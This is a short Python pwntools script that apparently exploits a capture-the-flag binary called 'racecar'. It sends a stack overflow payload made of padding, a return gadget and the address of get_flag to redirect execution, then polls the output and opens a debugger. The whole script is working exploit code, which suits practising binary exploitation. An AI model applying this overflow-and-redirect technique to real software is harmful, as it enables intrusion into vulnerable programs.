from pwn import *

elf = context.binary = ELF("./racecar")
r = elf.process()


r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"racer: ", b"0" * 0x100)
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"racer: ", b"1" * (0x25) + p64(0x000000000040101a) + p64(elf.sym["get_flag"]))
while True:
    r.sendlineafter(b'> ', b'2')
    r.recvuntil(b"winner: ")
    output = r.recvline()[:-1]
    print("Send Data: ", output)
    if (len(output) > 0x100 & output[4] == 48):
        break

gdb.attach(r, '''b*run + 627''')
r.interactive()